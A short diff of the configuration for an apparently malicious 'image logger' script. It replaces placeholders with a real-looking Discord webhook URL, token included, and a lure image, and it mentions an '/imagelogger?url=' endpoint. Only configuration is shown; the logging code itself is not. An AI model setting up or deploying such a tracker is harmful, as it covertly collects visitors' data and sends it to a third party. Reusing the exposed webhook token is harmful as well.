@@ -12,8 +12,8 @@ __author__ = ".arryb"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1340477823655219220/ECZ92iickYl6zkNIP-KeerBnW9UPcnfv5Mt6rqD_bZWdnFG8GSsP8Tf958B4uv0kXiNd",
+    "image": "https://images.newscientist.com/wp-content/uploads/2024/02/21153039/SEI_192567748.jpg?width=800", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
